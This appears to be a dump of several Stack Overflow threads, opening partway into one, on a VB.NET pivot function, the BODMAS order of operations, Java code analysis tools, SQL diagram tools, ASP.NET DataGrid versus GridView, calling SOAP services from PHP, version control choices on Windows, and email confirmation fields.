 <p>I had to do this for a project before. One of the major difficulties I had was explaining what I was trying to do to other people. I spent a ton of time trying to do this in SQL, but I found the pivot function woefully inadequate. I do not remember the exact reason why it was, but it is too simplistic for most applications, and it isn't full implemented in MS SQL 2000. I wound up writing a pivot function in .NET. I'll post it here in hopes it helps someone, someday. </p>

<pre><code> ''' &lt;summary&gt;<br>    ''' Pivots a data table from rows to columns<br>    ''' &lt;/summary&gt;<br>    ''' &lt;param name=""dtOriginal""&gt;The data table to be transformed&lt;/param&gt;<br>    ''' &lt;param name=""strKeyColumn""&gt;The name of the column that identifies each row&lt;/param&gt;<br>    ''' &lt;param name=""strNameColumn""&gt;The name of the column with the values to be transformed from rows to columns&lt;/param&gt;<br>    ''' &lt;param name=""strValueColumn""&gt;The name of the column with the values to pivot into the new columns&lt;/param&gt;<br>    ''' &lt;returns&gt;The transformed data table&lt;/returns&gt;<br>    ''' &lt;remarks&gt;&lt;/remarks&gt;<br>    Public Shared Function PivotTable(ByVal dtOriginal As DataTable, ByVal strKeyColumn As String, ByVal strNameColumn As String, ByVal strValueColumn As String) As DataTable<br>        Dim dtReturn As DataTable<br>        Dim drReturn As DataRow<br>        Dim strLastKey As String = String.Empty<br>        Dim blnFirstRow As Boolean = True<br><br>        ' copy the original data table and remove the name and value columns<br>        dtReturn = dtOriginal.Clone<br>        dtReturn.Columns.Remove(strNameColumn)<br>        dtReturn.Columns.Remove(strValueColumn)<br><br>        ' create a new row for the new data table<br>        drReturn = dtReturn.NewRow<br><br>        ' Fill the new data table with data from the original table<br>        For Each drOriginal As DataRow In dtOriginal.Rows<br><br>            ' Determine if a new row needs to be started<br>            If drOriginal(strKeyColumn).ToString &lt;&gt; strLastKey Then<br><br>                ' If this is not the first row, the previous row needs to be added to the new data table<br>                If Not blnFirstRow Then<br>                    dtReturn.Rows.Add(drReturn)<br>                End If<br><br>                blnFirstRow = False<br>                drReturn = dtReturn.NewRow<br><br>                ' Add all non-pivot column values to the new row<br>                For Each dcOriginal As DataColumn In dtOriginal.Columns<br>                    If dcOriginal.ColumnName &lt;&gt; strNameColumn AndAlso dcOriginal.ColumnName &lt;&gt; strValueColumn Then<br>                        drReturn(dcOriginal.ColumnName.ToLower) = drOriginal(dcOriginal.ColumnName.ToLower)<br>                    End If<br>                Next<br>                strLastKey = drOriginal(strKeyColumn).ToString<br>            End If<br><br>            ' Add new columns if needed and then assign the pivot values to the proper column<br>            If Not dtReturn.Columns.Contains(drOriginal(strNameColumn).ToString) Then<br>                dtReturn.Columns.Add(drOriginal(strNameColumn).ToString, drOriginal(strValueColumn).GetType)<br>            End If<br>            drReturn(drOriginal(strNameColumn).ToString) = drOriginal(strValueColumn)<br>        Next<br><br>        ' Add the final row to the new data table<br>        dtReturn.Rows.Add(drReturn)<br><br>        ' Return the transformed data table<br>        Return dtReturn<br>    End Function<br></code></pre> <pre><code>SELECT IDColumn, 
       NumberOfColumnsGreaterThanThree = (CASE WHEN Column1 &gt;= 3 THEN 1 ELSE 0 END) + 
                                         (CASE WHEN Column2 &gt;= 3 THEN 1 ELSE 0 END) + 
                                         (Case WHEN Column3 &gt;= 3 THEN 1 ELSE 0 END) 
FROM TableA;
</code></pre>
"
"What does the term ""BODMAS"" mean? <p>What is BODMAS and why is it useful in programming?</p> <p><a href=""http://www.easymaths.com/What_on_earth_is_Bodmas.htm""><a href=""http://www.easymaths.com/What_on_earth_is_Bodmas.htm"">http://www.easymaths.com/What_on_earth_is_Bodmas.htm</a></a>:</p>

<blockquote>
  <p>What do you think the answer to 2 + 3 x 5 is?</p>
  
  <p>Is it (2 + 3) x 5 = 5 x 5 = 25 ?</p>
  
  <p>or 2 + (3 x 5) = 2 + 15 = 17 ?</p>
  
  <p>BODMAS can come to the rescue and give us rules to follow so that we always get the right answer:</p>
  
  <p>(B)rackets (O)rder (D)ivision (M)ultiplication (A)ddition (S)ubtraction</p>
  
  <p>According to BODMAS, multiplication should always be done before addition, therefore 17 is actually the correct answer according to BODMAS and will also be the answer which your calculator will give if you type in 2 + 3 x 5 .</p>
</blockquote>

<p>Why it is useful in programming? No idea, but i assume it's because you can get rid of some brackets? I am a quite defensive programmer, so my lines can look like this:</p>

<pre><code>result = (((i + 4) - (a + b)) * MAGIC_NUMBER) - ANOTHER_MAGIC_NUMBER;
</code></pre>

<p>with BODMAS you can make this a bit clearer:</p>

<pre><code>result = (i + 4 - (a + b)) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;
</code></pre>

<p>I think i'd still use the first variant - more brackets, but that way i do not have to learn yet another rule and i run into less risk of forgetting it and causing those weird hard to debug errors?</p>

<p>Just guessing at that part though.</p>

<p>Mike Stone EDIT: Fixed math as Gaius points out</p>
 <p>Another version of this (in middle school) was ""Please Excuse My Dear Aunt Sally"".</p>

<ul>
<li>Parentheses</li>
<li>Exponents</li>
<li>Multiplication</li>
<li>Division</li>
<li>Addition</li>
<li>Subtraction</li>
</ul>

<p>The mnemonic device was helpful in school, and still useful in programming today.</p> <p>Order of operations in an expression, such as:</p>

<pre><code>foo * (bar + baz^2 / foo)
</code></pre>

<ul>
<li><strong>B</strong>rackets first</li>
<li><strong>O</strong>rders (ie Powers and Square Roots, etc.)</li>
<li><strong>D</strong>ivision and <strong>M</strong>ultiplication (left-to-right)</li>
<li><strong>A</strong>ddition and <strong>S</strong>ubtraction (left-to-right)</li>
</ul>

<p>source: <a href=""http://www.mathsisfun.com/operation-order-bodmas.html"" rel=""nofollow"">http://www.mathsisfun.com/operation-order-bodmas.html</a></p>
 <p>When I learned this in grade school (in Canada) it was referred to as BEDMAS:</p>

<p><strong>B</strong>rackets <br>
<strong>E</strong>xponents <br>
<strong>D</strong>ivision <br>
<strong>M</strong>ultiplication <br>
<strong>A</strong>ddition <br>
<strong>S</strong>ubtraction</p>

<p>Just for those from this part of the world...</p> <p>I'm not really sure how applicable to programming the old BODMAS mnemonic is anyways.  There is no guarantee on order of operations between languages, and while many keep the standard operations in that order, not all do.  And then there are some languages where order of operations isn't really all that meaningful (Lisp dialects, for example).  In a way, you're probably better off for programming if you forget the standard order and either use parentheses for everything(eg (a*b) + c) or specifically learn the order for each language you work in.</p> <p>I don't have the power to edit <a href=""http://stackoverflow.com/a/3511/50776"">@Michael Stum's answer</a>, but it's not quite correct.  He reduces</p>

<pre><code>(i + 4) - (a + b)
</code></pre>

<p>to</p>

<pre><code>(i + 4 - a + b)
</code></pre>

<p>They are not equivalent.  The best reduction I can get for the whole expression is</p>

<pre><code>((i + 4) - (a + b)) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;
</code></pre>

<p>or</p>

<pre><code>(i + 4 - a - b) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;
</code></pre>
 <p>I read somewhere that especially in C/C++ splitting your expressions into small statements was better for optimisation; so instead of writing hugely complex expressions in one line, you cache the parts into variables and do each one in steps, then build them up as you go along.</p>

<p>The optimisation routines will use registers in places where you had variables so it shouldn't impact space but it can help the compiler a little.</p>
"
"What code analysis tools do you use for your Java projects? <p>What code analysis tools do you use on your Java projects?</p>

<p>I am interested in all kinds</p>

<ul>
<li>static code analysis tools (FindBugs, PMD, and any others)</li>
<li>code coverage tools (Cobertura, Emma, and any others)</li>
<li>any other instrumentation-based tools </li>
<li>anything else, if I'm missing something</li>
</ul>

<p>If applicable, also state what build tools you use and how well these tools integrate with both your IDEs and build tools. </p>

<p>If a tool is only available a specific way (as an IDE plugin, or, say, a build tool plugin) that information is also worth noting.</p>
 <p>We use FindBugs and JDepend integrated with Ant. We use JUnit but we're not using any coverage tool. </p>

<p>I'm not using it integrated to Rational Application Developer (the IDE I'm using to develop J2EE applications) because I like how neat it looks when you run javac in the Windows console. :P</p> <p><a href=""http://checkstyle.sourceforge.net/"" rel=""nofollow"">Checkstyle</a> is another one I've used at a previous company... it's mainly for style checking, but it can do some static analysis too.  Also, <a href=""http://www.atlassian.com/software/clover/"" rel=""nofollow"">Clover</a> for code coverage, though be aware it is not a free tool.</p> <p>We are using FindBugs and Checkstyle as well as Clover for Code Coverage. </p>

<p>I think it's important to have some kind of static analysis, supporting your development. Unfortunately it's still not widely spread that these tools are important.</p> <p>I am looking for many answers to learn about new tools and consolidate this knowledge in a one question/thread, so I doubt there will be 1 true answer to this question.</p>

<p>My answer to my own question is that we use:</p>

<ul>
<li>Findbugs to look for common errors bad/coding - run from maven, and also integrates easily into Eclipse</li>
<li>Cobertura for our coverage reports - run from maven</li>
</ul>

<p>Hudson also has a task-scanner plugin that will display a count of your TODO and FIXMEs, as well as show where they are in the source files.</p>

<p>All are integrated with Maven 1.x in our case and tied into Hudson, which runs our builds on check-in as well as extra things nightly and weekly. Hudson trend graphs our JUnit tests, coverage, findbugs, as well as open tasks. There is also a Hudson plugin that reports and graphs our compile warnings. We also have several performance tests with their own graphs of performance and memory use over time using the Hudson plots plugin as well.</p> <p>All of the following we use and integrate easiy in both our Maven 2.x builds and Eclipse/RAD 7:</p>

<ul>
<li>Testing - JUnit/TestNG</li>
<li>Code analysis - FindBugs, PMD</li>
<li>Code coverage - Clover</li>
</ul>

<p>In addition, in our Maven builds we have:</p>

<ul>
<li>JDepend</li>
<li>Tag checker (TODO, FIXME, etc)</li>
</ul>

<p>Furthermore, if you're using Maven 2.x, CodeHaus has a collection of handy Maven plugins in their <a href=""http://mojo.codehaus.org/plugins.html"">Mojo project</a>.</p>

<p>Note: Clover has out-of-the-box integration with the Bamboo CI server (since they're both Atlassian products). There are also Bamboo plugins for FindBugs, PMD, and CheckStyle but, as noted, the free Hudson CI server has those too.</p>
 <p>For static analysis tools I often use CPD, <a href=""http://pmd.sourceforge.net"">PMD</a>, <a href=""http://findbugs.sourceforge.net"">FindBugs</a>, and <a href=""http://checkstyle.sourceforge.net"">Checkstyle</a>.</p>

<p><p>CPD is the PMD ""Copy/Paste Detector"" tool. I was using PMD for a little while before I noticed the <a href=""http://pmd.sourceforge.net/cpd.html"">""Finding Duplicated Code"" link</a> on the <a href=""http://pmd.sourceforge.net"">PMD web page</a>.</p>

<p><p>I'd like to point out that these tools can sometimes be extended beyond their ""out-of-the-box"" set of rules. And not just because they're open source so that you can rewrite them. Some of these tools come with applications or ""hooks"" that allow them to be extended. For example, PMD comes with the <a href=""http://pmd.sourceforge.net/howtowritearule.html"">""designer"" tool</a> that allows you to create new rules. Also, Checkstyle has the <a href=""http://checkstyle.sourceforge.net/config_misc.html#DescendantToken"">DescendantToken</a> check that has properties that allow for substantial customization.</p>

<p><p>I integrate these tools with <a href=""http://virtualteamtls.svn.sourceforge.net/viewvc/virtualteamtls/trunk/scm/common.xml?view=markup"">an Ant-based build</a>. You can follow the link to see my commented configuration.</p>

<p><p>In addition to the simple integration into the build, I find it helpful to configure the tools to be somewhat ""integrated"" in a couple of other ways. Namely, report generation and warning suppression uniformity. I'd like to add these aspects to this discussion (which should probably have the ""static-analysis"" tag also): how are folks configuring these tools to create a ""unified"" solution? (I've asked this question separately <a href=""http://stackoverflow.com/questions/79918/configuring-static-analysis-tools-for-uniformity"">here</a>)</p>

<p><p>First, for warning reports, I transform the output so that each warning has the simple format:</p>

<pre><code>/absolute-path/filename:line-number:column-number: warning(tool-name): message</code></pre>

<p><p>This is often called the ""Emacs format,"" but even if you aren't using Emacs, it's a reasonable format for homogenizing reports. For example:</p>

<pre><code>/project/src/com/example/Foo.java:425:9: warning(Checkstyle):Missing a Javadoc comment.</code></pre>

<p><p>My warning format transformations are done by my Ant script with Ant <a href=""http://ant.apache.org/manual/Types/filterchain.html"">filterchains</a>.</p>

<p><p>The second ""integration"" that I do is for warning suppression. By default, each tool supports comments or an annotation (or both) that you can place in your code to silence a warning that you want to ignore. But these various warning suppression requests do not have a consistent look which seems somewhat silly. When you're suppressing a warning, you're suppressing a warning, so why not always write ""<code>SuppressWarning</code>?""</p>

<p><p>For example, PMD's default configuration suppresses warning generation on lines of code with the string ""<code>NOPMD</code>"" in a comment. Also, PMD supports Java's <code>@SuppressWarnings</code> annotation. I configure PMD to use comments containing ""<code>SuppressWarning(PMD.</code>"" instead of <code>NOPMD</code> so that PMD suppressions look alike. I fill in the particular rule that is violated when using the comment style suppression:</p>

<pre><code>// SuppressWarnings(PMD.PreserveStackTrace) justification: (false positive) exceptions are chained</code></pre>

<p><p>Only the ""<code>SuppressWarnings(PMD.</code>"" part is significant for a comment, but it is consistent with PMD's support for the <code>@SuppressWarning</code> annotation which does recognize individual rule violations by name:</p>

<pre><code>@SuppressWarnings(""PMD.CompareObjectsWithEquals"") // justification: identity comparision intended</code></pre>

<p><p>Similarly, Checkstyle suppresses warning generation between pairs of comments (no annotation support is provided). By default, comments to turn Checkstyle off and on contain the strings <code>CHECKSTYLE:OFF</code> and <code>CHECKSTYLE:ON</code>, respectively. Changing this configuration (with Checkstyle's ""SuppressionCommentFilter"") to use the strings ""<code>BEGIN&nbsp;SuppressWarnings(CheckStyle.</code>"" and ""<code>END&nbsp;SuppressWarnings(CheckStyle.</code>"" makes the controls look more like PMD:</p>

<pre>
<code>// BEGIN SuppressWarnings(Checkstyle.HiddenField) justification: ""Effective Java,"" 2nd ed., Bloch, Item 2</code>
<code>// END SuppressWarnings(Checkstyle.HiddenField)</code>
</pre>

<p><p>With Checkstyle comments, the particular check violation (<code>HiddenField</code>) <em>is</em> significant because each check has its own ""<code>BEGIN/END</code>"" comment pair.</p>

<p><p>FindBugs also supports warning generation suppression with a <code>@SuppressWarnings</code> annotation, so no further configuration is required to achieve some level of uniformity with other tools. Unfortunately, Findbugs has to support a custom <code>@SuppressWarnings</code> annotation because the built-in Java <code>@SuppressWarnings</code> annotation has a <code>SOURCE</code> retention policy which is not strong enough to retain the annotation in the class file where FindBugs needs it. I fully qualify FindBugs warnings suppressions to avoid clashing with Java's <code>@SuppressWarnings</code> annotation:</p>

<pre><code>@edu.umd.cs.findbugs.annotations.SuppressWarnings(""UWF&#95;FIELD&#95;NOT&#95;INITIALIZED&#95;IN&#95;CONSTRUCTOR"")</code></pre>

<p><p>These techniques makes things look reasonably consistent across tools. Note that having each warning suppression contain the string ""<code>SuppressWarnings</code>"" makes it easy to run a simple search to find all instances for all tools over an entire code base.</p>
 <p>I've had good luck with Cobertura.  It's a code coverage tool which can be executed via your ant script as part of your normal build and can be integrated into Hudson.</p>
 <p>I use the static analysis built into IntelliJ IDEA. Perfect integration.</p>

<p>I use the code coverage built into Intellij IDEA (based on EMMA). Again, perfect integration.</p>

<p>This integrated solution is reliable, powerful, and easy-to-use compared to piecing together tools from various vendors.</p>
 <p>Our team use PMD and Cobertura, actually our projects are maven projects and there is very simple to include plug ins for code analysis. The real question would be for specific project which analysis you need to use, my opinion is that it's you couldn't use the same plugins for each project.</p>
 <p>I use a combination of Cobertura, Checkstyle, (Ecl)Emma and Findbugs.</p>

<p><a href=""http://www.eclemma.org/"">EclEmma</a> is an <em>awesome</em> Eclipse plugin that shows the code coverage by coloring the java source in the editor (<a href=""http://www.eclemma.org/images/screen.png"">screenshot</a>) - the coverage is generated by running a JUnit test. This is really useful when you are trying to figure out which lines are covered in a particular class, or if you want to see just which lines are covered by a single test. This is much more user friendly and useful than generating a report and then looking through the report to see which classes have low coverage.</p>

<p>The Checkstyle and Findbugs Eclipse plugins are also useful, they generate warnings in the editor as you type.</p>

<p>Maven2 has report plugins that work with the above tools to generate reports at build time. We use this to get overall project reports, which are more useful when you want aggregate numbers. These are generated by our CI builds, which run using <a href=""http://continuum.apache.org/"">Continuum</a>.</p>
 <p>in our project we use Sonar in front of checkstyle, pmd.... together with the CI (Bamboo, Hudson) we get also a nice history of our source quality and what directing we go. I do like Sonar, because you one central tool in the CI Stack that does it for you, and you can easy customize the rules for each project.</p>
 <p><a href=""http://www.headwaysoftware.com/"" rel=""nofollow"">Structure 101</a> is good at code analysis and finding the cyclic package dependencies.</p>
"
"What program can I use to generate diagrams of SQL view/table structure? <p>I've been tasked with redesigning part of a ms-sql database structure which currently involves a lot of views, some of which contain joins to other views. </p>

<p>Anyway, I wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structure.</p>

<p>What's the best program you've used for such problems?</p>
 <P>If you are talking about MS SQL Server tables, I like the diagram support in SQL Server Management Studio. You just drag the tables from the explorer onto the canvas, and they are laid out for you along with lines for relationships. You'll have to do some adjusting by hand for the best looking diagrams, but it is a decent way to get diagrams.</P> <p>I am a big fan of Embarcadero's <a href=""http://www.embarcadero.com/products/er-studio"" rel=""nofollow"">ER/Studio</a>.  It is very powerful and produces excellent on-screen as well as printed results.  They have a free trial as well, so you should be able to get in and give it a shot without too much strife.</p>

<p>Good luck!</p>
 <p>Toad Data Modeller from Quest does a nice job on this and is reasonably priced.  Embarcadero E/R studio is good too, as Bruce mentioned.</p> <P>OP asked about diagramming views and view dependencies, SQL Management Studio and Enterprise Manager doesn't allow you to diagram views. I can't vouch for the other tools.</P>
<P>The LINQ to SQL designer for Visual Studio does allow you to drop views on the design surface but there isn't a easy way to model the dependencies between the views. I'm not sure which tool has this type of diagramming functionality. You could take a look at Red Gate's SQLDoc tool but it just provides text based output.</P> <p>I upmodded Mark's post about Toad Data Modeler and wanted to point out that they have a beta version that is fully functional and free. The only downsides are the occasional bug and built in expiration (typically around the time a new beta is available), but for this poor bloke it does wonders until I can get my boss to chip in for a license.</p>
"
"The Difference Between a DataGrid and a GridView in ASP.NET? <p>I've been doing ASP.NET development for a little while now, and I've used both the GridView and the DataGrid controls before for various things, but I never could find a really good reason to use one or the other. I'd like to know:</p>

<p>What is the difference between these 2 ASP.NET controls? What are the advantages or disadvantages of both? Is one any faster? Newer? Easier to maintain?</p>

<p>The intellisense summary for the controls doesn't seem to describe any difference between the two. They both can view, edit, and sort data and automatically generate columns at runtime.</p>

<p><strong>Edit:</strong> Visual Studio 2008 no longer lists DataGrid as an available control in the toolbox. It is still available (for legacy support I assume) if you type it in by hand though.</p> <p>The DataGrid was originally in .NET 1.0.  The GridView was introduced (and replaced the DataGrid) in .NET 2.0.  They provide nearly identical functionality.</p> <p>DataGrid was an ASP.NET 1.1 control, still supported. GridView arrived in 2.0, made certain tasks simpler added different databinding features:</p>

<p>This link has a comparison of DataGrid and GridView features -</p>

<p><a href=""https://msdn.microsoft.com/en-us/library/05yye6k9(v=vs.100).aspx"" rel=""nofollow"">https://msdn.microsoft.com/en-us/library/05yye6k9(v=vs.100).aspx</a></p>
 <p>The key difference is in the ViewState management IIRC. The DataGrid requires ViewState turned on in order to have edit and sort capabilities.</p>
 <p>If you're working in Visual Studio 2008 / .NET 3.5, you probably shouldn't use either. Use the ListView - it gives you the features of the GridView combined with the styling flexibility of a repeater.</p>
 <p>some basic diffrence between gridview and  details view</p>

<p>the GridView control also has a number of new features and advantages over the DataGrid control, which include: </p>

<p>· Richer design-time capabilities. 
· Improved data source binding capabilities. 
· Automatic handling of sorting, paging, updates, and deletes. 
· Additional column types and design-time column operations. 
· A Customized pager user interface (UI) with the PagerTemplate property. </p>

<p>Differences between the GridView control and the DataGrid control include: 
· Different custom-paging support. 
· Different event models.</p>
 <p>One key difference security wise is that DataGrid uses BoundColumn which does not HtmlEncode the bound data.  There is no property to turn HtmlEncoding on or off either, so you need to do it in code somehow.</p>

<p>GridView uses BoundField, which does HtmlEncode by default on the bound data and it has a HtmlEncode property if you need to turn it off.</p>
 <p>The <code>GridView</code> control is the successor to the <code>DataGrid</code> control. Like the <code>DataGrid</code> control, the <code>GridView</code> control was designed to display data in an HTML table. When bound to a data source, the <code>DataGrid</code> and <code>GridView</code> controls each display a row from a <code>DataSource</code> as a row in an output table.</p>

<p>Both the <code>DataGrid</code> and <code>GridView</code> controls are derived from the <code>WebControl</code> class. Although it has a similar object model to that of the <code>DataGrid</code> control, the GridView control also has a number of new features and advantages over the <code>DataGrid</code> control, which include:</p>

<ul>
<li>Richer design-time capabilities.</li>
<li>Improved data source binding capabilities.</li>
<li>Automatic handling of sorting, paging, updates, and deletes.</li>
<li>Additional column types and design-time column operations.</li>
<li>A Customized pager user interface (UI) with the PagerTemplate property.</li>
</ul>

<p>Differences between the <code>GridView</code> control and the <code>DataGrid</code> control include:</p>

<ul>
<li>Different custom-paging support.</li>
<li>Different event models.</li>
</ul>

<p>Sorting, paging, and in-place editing of data requires additional coding when using the <code>DataGrid</code> control. The <code>GridView</code> control enables you to add sorting, paging, and editing capabilities without writing any code. Instead, you can automate these tasks, along with other common tasks such as data binding to a data source, by setting properties on the control.</p>
"
"How to easily consume a web service from PHP <p>Is there available any tool for PHP which can be used to generate code for consuming a <a href=""http://en.wikipedia.org/wiki/Web_service"">web service</a> based on its <a href=""http://en.wikipedia.org/wiki/Web_Services_Description_Language"">WSDL</a>? Something comparable to clicking ""Add Web Reference"" in Visual Studio or the Eclipse plugin which does the same thing for Java.</p>
 <p>Well, those features are specific to a tool that you are using for development in those languages.</p>

<p>You wouldn't have those tools if (for example) you were using notepad to write code. So, maybe you should ask the question for the tool you are using.</p>

<p>For PHP: <a href=""http://webservices.xml.com/pub/a/ws/2004/03/24/phpws.html"" rel=""nofollow"">http://webservices.xml.com/pub/a/ws/2004/03/24/phpws.html</a></p> <p>I have used <a href=""http://www.scottnichol.com/nusoapintro.htm"">NuSOAP</a> in the past.  I liked it because it is just a set of PHP files that you can include.  There is nothing to install on the web server and no config options to change.  It has WSDL support as well which is a bonus.</p>
 <p>I've had great success with <a href=""https://github.com/jbarciauskas/wsdl2php"" rel=""nofollow"">wsdl2php</a>.  It will automatically create wrapper classes for all objects and methods used in your web service.</p>
 <p>In PHP 5 you can use <a href=""http://www.php.net/manual/en/ref.soap.php"">SoapClient</a> on the WSDL to call the web service functions. <a href=""http://www.php.net/manual/en/soapclient.construct.php"">For example</a>:</p>

<pre><code>$client = new SoapClient(""some.wsdl"");
</code></pre>

<p>and $client is now an object which has class methods as defined in some.wsdl. So if there was a method called getTime in the WSDL then you would just call:</p>

<pre><code>$result = $client-&gt;getTime();
</code></pre>

<p>And the result of that would (obviously) be in the $result variable. You can use the __getFunctions method to return a list of all the available methods.</p>
 <p>This <a href=""http://4rapiddev.com/php/call-web-service-wsdl-example/"" rel=""nofollow"">article</a> explains how you can use PHP SoapClient to call a api web service.</p>
 <p>HI I got this from this site : <a href=""http://forums.asp.net/t/887892.aspx?Consume+an+ASP+NET+Web+Service+with+PHP"" rel=""nofollow"">http://forums.asp.net/t/887892.aspx?Consume+an+ASP+NET+Web+Service+with+PHP</a></p>

<p>The web service has method <code>Add</code> which takes two params:</p>

<pre><code>&lt;?php
    $client = new SoapClient(""http://localhost/csharp/web_service.asmx?wsdl"");

     print_r( $client-&gt;Add(array(""a"" =&gt; ""5"", ""b"" =&gt;""2"")));
?&gt;
</code></pre>
 <p>Say you were provided the following:</p>

<pre><code>&lt;x:Envelope xmlns:x=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:int=""http://thesite.com/""&gt;
    &lt;x:Header/&gt;
    &lt;x:Body&gt;
        &lt;int:authenticateLogin&gt;
            &lt;int:LoginId&gt;12345&lt;/int:LoginId&gt;
        &lt;/int:authenticateLogin&gt;
    &lt;/x:Body&gt;
&lt;/x:Envelope&gt;
</code></pre>

<p>and</p>

<pre><code>&lt;s:Envelope xmlns:s=""http://schemas.xmlsoap.org/soap/envelope/""&gt;
    &lt;s:Body xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema""&gt;
        &lt;authenticateLoginResponse xmlns=""http://thesite.com/""&gt;
            &lt;authenticateLoginResult&gt;
                &lt;RequestStatus&gt;true&lt;/RequestStatus&gt;
                &lt;UserName&gt;003p0000006XKX3AAO&lt;/UserName&gt;
                &lt;BearerToken&gt;Abcdef1234567890&lt;/BearerToken&gt;
            &lt;/authenticateLoginResult&gt;
        &lt;/authenticateLoginResponse&gt;
    &lt;/s:Body&gt;
&lt;/s:Envelope&gt;
</code></pre>

<p>Let's say that accessing <a href=""http://thesite.com/"" rel=""nofollow"">http://thesite.com/</a> said that the WSDL address is:
<a href=""http://thesite.com/PortalIntegratorService.svc?wsdl"" rel=""nofollow"">http://thesite.com/PortalIntegratorService.svc?wsdl</a></p>

<pre><code>$client = new SoapClient('http://thesite.com/PortalIntegratorService.svc?wsdl');
$result = $client-&gt;authenticateLogin(array('LoginId' =&gt; 12345));
if (!empty($result-&gt;authenticateLoginResult-&gt;RequestStatus)
    &amp;&amp; !empty($result-&gt;authenticateLoginResult-&gt;UserName)) {
    echo 'The username is: '.$result-&gt;authenticateLoginResult-&gt;UserName;
}
</code></pre>

<p>As you can see, the items specified in the XML are used in the PHP code though the LoginId value can be changed.</p>
"
"DVCS Choices - What's good for Windows? <p>So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with ""install cygwin..."".  Now I've <em>heard</em> that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.
Can I get any recommendations?</p> <p>EDIT: Perhaps add a ""dvcs"", ""distrubutedversioncontrol"", ""distrubuted""</p>

<p>I've used Mercurial on Windows with no problems. You can use TortoiseHG or just use the command line. Mercurial does require Python, but that is easy to install in Windows as well.</p>

<p><a href=""http://www.selenic.com/mercurial/wiki/index.cgi/BinaryPackages#head-adac70dc1664bb9eac334d5c8b57483d300254f3"" rel=""nofollow"">Mercurial Binary Packages</a></p> <p>I use <a href=""http://code.google.com/p/msysgit/"" rel=""nofollow"">msys-git</a> on windows every single day. Works fast and flawlessly.</p>

<p>Although the newer build has some problems with git-svn, <a href=""http://msysgit.googlecode.com/files/Git-1.5.5-preview20080413.exe"" rel=""nofollow"">this build (Git-1.5.5-preview20080413.exe)</a> has a working git-svn.</p> <p>There's a nice comparison between git, hg and bzr in <a href=""http://www.infoq.com/articles/dvcs-guide"" rel=""nofollow"">this InfoQ article</a>.  They all have their strengths and weaknesses.  You'll have to think about your project and your workflows and choose the best fit.  The good news is that they're all fairly good.</p> <p>I agree with basszero. I'm using mercurial under windows and it's as easy and reliable as it can get. My development team is spread over Europe (well Dublin and Vienna :-).
We use VPN to commit or sometime the built in webserver (hgserve). Both work fine with no problems out of the box.</p>

<p>Also diff3 open source tool works perfect with mercurial and TortoiseHG out of the box.</p>
 <p>I've had the best luck with Bazaar, followed by Mercurial. Never could get Git to work correctly. A quick search shows that Git still requires clunky emulation layers like Cygwin/MSYS, and I can't find any integration tools like TortoiseBzr for Git.</p>

<p>With Mercurial in Windows, I had several minor issues (insensitive paths, symlinks, ). They were usually fixed eventually, but I felt that the same quality of testing was not applied to running on Windows as for the other platforms. Bazaar also had better documentation for integrating with native applications like Visual C.</p>
 <p>In my experience using GIT on windows is a major pain.  But I have been using Fossil SCM for some time now, and I think it actually fits your needs exactly.</p>

<p>It also has a built in Ticket system and a Wiki.  And the whole program is contained in 1 file and it works right out of the box.</p>

<p>I totally recommend it.</p>

<p>Here is a link to the site <a href=""http://www.fossil-scm.org/"" rel=""nofollow"">http://www.fossil-scm.org/</a></p>

<p>Remember, this site is self hosting, what that means is you are looking at the web interface to fossil it self, when you look at tickets and the wiki and documentation, you actually are using fossil.</p>

<p>But if your project has millions of lines of code and is a few gigabytes in size, you have to use GIT, there is no way around that problem.</p>

<p>Enjoy.</p>
 <p>If you are concerned about an easy to use interface:</p>

<p>The bazaar folk now include TortoiseBzr in their windows binary package.  That's got to be a pretty strong indicator that they think it is up to snuff.  I don't know what the maturity/stability of TortoiseHg is, but there certainly isn't a decent GUI interface for git yet, and the MSYS git build still needs some work IMO.</p>

<p>If your team are comfortable with or prefer the command line, then either bazaar or mercurial would probably work well for you, and are both probably about the same in terms of learning curve.  Git's learning curve is much higher.  It is like the swiss-army knife that is almost wider than it is long, with all the little gadgets and do-dads in it and hanging off it, with the springs so tight that you occasionally slice a finger open trying to prise a blade out.</p>
 <p>At last I checked, the only thing you need for Mercurial is Python and to <a href=""http://www.selenic.com/mercurial/wiki/index.cgi/BinaryPackages"" rel=""nofollow"">grab a binary package</a>. If you find yourself with more time and want to fiddle / build it yourself, <a href=""http://www.selenic.com/mercurial/wiki/index.cgi/WindowsInstall"" rel=""nofollow"">look here</a>.</p>

<p>The only real drawback with HG is its idea of branching .. but for some people that's a major plus.</p>

<p>I like it because its intuitive, easy to install and works on anything that Python does. I don't think that all of the available plugins will work for you, but most should.</p>
"
"Is a ""Confirm Email"" input good practice when user changes email address? <p>My organization has a form to allow users to update their email address with us.
It's suggested that we have two input boxes for email: the second as an email confirmation.</p>

<p>I always copy/paste my email address when faced with the confirmation.
I'm assuming most of our users are not so savvy.</p>

<p>Regardless, is this considered a good practice?
I can't stand it personally, but I also realize it probably isn't meant for me.
If someone screws up their email, they can't login, and they must call to sort things out.</p> <p>I agree with you in that it is quite an annoyance to me (I also copy and paste my address into the second input).</p>

<p>That being said, for less savvy users, it is probably a good idea. Watching my mother type is affirmation that many users do not look at the screen when they type (when she's using her laptop she resembles Linus from Peanuts when he's playing the piano).  If it's important for you to have the user's correct email address then I would say having a confirmation input is a very good idea (one of these days I'll probably type my email address wrong in the first box and paste it wrong into the second box and then feel like a complete idiot).</p> <p>I would just use one input box. The ""Confirm"" input is a remnant form the ""Confirm Password"" method. </p>

<p>With passwords, this is useful because they are usually typed as little circles. So, you can't just look at it to make sure that you typed it correctly. </p>

<p>With a regular text box, you can visually check your input. So, there is no need for a confirmation input box.</p> <p>I agree with Justin, while most technical folks will use the copy, paste method, for the less savvy users it is a good practice.</p>

